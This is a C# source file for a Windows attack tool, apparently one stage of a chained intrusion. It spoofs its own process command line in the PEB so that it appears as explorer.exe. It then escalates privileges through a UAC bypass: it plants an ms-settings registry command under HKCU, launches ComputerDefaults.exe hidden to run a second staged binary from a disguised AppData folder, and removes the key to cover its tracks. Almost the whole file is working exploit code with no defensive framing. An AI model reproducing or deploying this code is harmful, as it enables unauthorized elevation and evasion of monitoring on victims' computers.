using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SharpQQ3104
{
    class Program
    {
        // All credits to: https://github.com/FatRodzianko/SharpBypassUAC/blob/master/SharpBypassUAC/ComputerDefaults.cs
        // UAC Bypass using ComputerDefaults's registry key 
        public static void ComputerDefaults(string command)
        {
            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\ComputerDefaults.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(5000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
        }

        // Get value from IntPtr that points to a memory address 
        public static byte[] getValueFromPointer(IntPtr hProc, IntPtr pointer, int size)
        {
            byte[] memoryValue = new byte[size];
            ReadProcessMemory(hProc, pointer, memoryValue, size, out IntPtr nRead);

            return memoryValue;
        }

        // Get value from memory address byte array 
        public static byte[] getValueFromAddr(IntPtr hProc, byte[] memoryAddr, int size)
        {
            IntPtr memoryPtr = new IntPtr(BitConverter.ToInt32(memoryAddr, 0));
            byte[] value = new byte[size];
            ReadProcessMemory(hProc, memoryPtr, value, value.Length, out IntPtr nRead);

            return value;
        }


        public static byte[] addMemory(byte[] sourceMemory, int addition)
        {
            return BitConverter.GetBytes(BitConverter.ToInt32(sourceMemory, 0) + addition);
        }

        public static IntPtr addrToPointer(byte[] memoryAddr)
        {
            return new IntPtr(BitConverter.ToInt32(memoryAddr, 0));
        }

        public static string ByteArrayToString(byte[] ba)
        {
            byte[] returnArray = new byte[ba.Length];
            returnArray = ba.ToArray();
            Array.Reverse(returnArray);

            return "0x" + String.Concat(Array.ConvertAll(returnArray, x => x.ToString("X2")));
        }

        /*
         * RTL_USER_PROCESS_PARAMETERS = 0x10;
            CommandLine = 0x40;
            ReadSize = 0x4;
         * */
        public static void spoofCmdLine()
        {
            // Open Process and get PEB 
            var hProc = OpenProcess(0x001F0FFF, true, Process.GetCurrentProcess().Id);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint temp = 0;
            ZwQueryInformationProcess(hProc, 0, ref bi, (uint)(IntPtr.Size * 6), ref temp);

            // Get pointer & address of rtluserparam by adding 0x10 
            IntPtr rtlUserParamPtr = (IntPtr)((Int64)bi.PebAddress + 0x10);
            Console.WriteLine("[+] RTL_USER_PROCESS_PARAM Address: 0x{0}", rtlUserParamPtr.ToInt64().ToString("x2"));

            byte[] rtlUserParamAddr = getValueFromPointer(hProc, rtlUserParamPtr, IntPtr.Size);
            Console.WriteLine("[+] RTL_USER_PROCESS_PARAM Value: {0}", ByteArrayToString(rtlUserParamAddr));

            // Get commandline, max length, buffer from RTL_USER_PROC_PARAM 
            byte[] cmdLineAddr = addMemory(rtlUserParamAddr, 0x40);
            byte[] bufferMaxLengthAddr = addMemory(rtlUserParamAddr, 0x42);
            byte[] bufferAddr = addMemory(rtlUserParamAddr, 0x44);
            int bufferMaxLength = (int)getValueFromAddr(hProc, bufferMaxLengthAddr, 1)[0];
            
            Console.WriteLine("[+] cmdLineAddr: {0}", ByteArrayToString(cmdLineAddr));
            Console.WriteLine("[+] bufferMaxLengthAddr: {0}", ByteArrayToString(bufferMaxLengthAddr));
            Console.WriteLine("[+] bufferAddr: {0}", ByteArrayToString(bufferAddr));

            // Print previous commandline buffer - should be something\\SharpQQ3104.exe 
            byte[] bufferValue = getValueFromAddr(hProc, bufferAddr, IntPtr.Size);
            IntPtr bufferPtr = new IntPtr(BitConverter.ToInt32(bufferValue, 0));
            byte[] bufferContent = new byte[bufferMaxLength];
            bufferContent = getValueFromPointer(hProc, bufferPtr, bufferContent.Length);
            
            Console.WriteLine("\n[+] Previous command line buffer: {0}", Encoding.ASCII.GetString(bufferContent));

            // Zero-out previous commandline buffer 
            byte[] zeroOut = new byte[bufferMaxLength];
            WriteProcessMemory(hProc, bufferPtr, zeroOut, zeroOut.Length, out IntPtr nWrite);

            // Overwrite new commandline string - C:\\windows\\explorer.exe 
            byte[] spoofPayload = Encoding.Unicode.GetBytes("c:\\Windows\\explorer.exe");
            WriteProcessMemory(hProc, bufferPtr, spoofPayload, spoofPayload.Length, out IntPtr nWrite2);

            // Validate the new commandline string 
            bufferContent = getValueFromPointer(hProc, bufferPtr, bufferMaxLength);
            Console.WriteLine("[+] Overwritten command line buffer: {0}", Encoding.ASCII.GetString(bufferContent));
        }

        static void Main(string[] args)
        {
            // 1. Spoof PEB and change commandline to `explorer.exe` 
            spoofCmdLine();

            // 2. Perform UAC bypass using elevation moniker against vulnerable COM interface 
            // 3. And execute qq2688.exe binary 
            string qq2688Path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\PeerDistRepub\\SharpQQ2688.exe";
            ComputerDefaults(qq2688Path);

            //Console.ReadLine();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId
        );


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
        lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
        int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
        Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }


        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;

        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }


    }
}
